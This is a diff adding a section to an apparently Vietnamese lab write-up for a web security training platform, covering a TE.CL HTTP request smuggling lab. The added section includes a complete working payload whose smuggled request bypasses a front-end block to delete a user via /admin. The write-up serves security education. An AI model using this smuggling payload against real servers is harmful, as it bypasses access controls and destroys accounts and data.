@@ -291,3 +291,60 @@ a=b
 Lab Solved!
 
 <img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f60dbfbf-97ce-4d95-a902-b8652472932f">
+
+***
+
+## 7. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+* Content:
+```
+This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
+
+To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
+```
+
+* Exploit:
+
+<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c6e959a6-ce3f-46d8-b0c2-0968bd2ecef8">
+
+Gọi đến link delete:
+
+<img width="472" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5dd0822c-2a6d-4936-9b9d-6f9edbeb0d0e">
+
+Full payload như sau:
+
+```
+POST / HTTP/1.1
+Host: 0a64008c03fb619d82b6b5d400a200dc.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+a=b
+0
+
+
+```
+
+Lab Solved!
+
+<img width="589" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f73bbf7c-9eb2-479d-b1c3-577c9a709f14">
+
